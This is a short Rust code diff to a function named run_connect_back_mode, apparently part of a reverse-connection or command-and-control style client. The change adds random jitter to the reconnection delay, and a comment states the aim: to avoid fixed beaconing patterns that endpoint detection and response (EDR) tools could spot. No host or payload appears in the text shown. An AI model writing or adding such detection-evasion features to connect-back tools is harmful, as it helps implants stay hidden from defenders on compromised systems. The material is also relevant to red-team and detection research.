@@ -1,4 +1,5 @@
 use log::{error, info, warn};
+use rand::Rng;
 use std::path::Path;
 use tokio::time::{sleep, Duration};
 
@@ -149,8 +150,16 @@ pub async fn run_connect_back_mode(host: &str, port: u16, delay: u64, psk: &str)
             }
         }
 
-        info!("Waiting {delay} seconds before next connection attempt...");
-        sleep(Duration::from_secs(delay)).await;
+        // Jitter: randomize delay to avoid fixed beaconing patterns detectable by EDR
+        let jitter_range = delay / 4; // ±25% of base delay
+        let jittered_delay = if jitter_range > 0 {
+            let offset = rand::thread_rng().gen_range(0..=jitter_range * 2);
+            delay.saturating_sub(jitter_range) + offset
+        } else {
+            delay
+        };
+        info!("Waiting {jittered_delay} seconds before next connection attempt (base: {delay}s)");
+        sleep(Duration::from_secs(jittered_delay)).await;
     }
 }
 
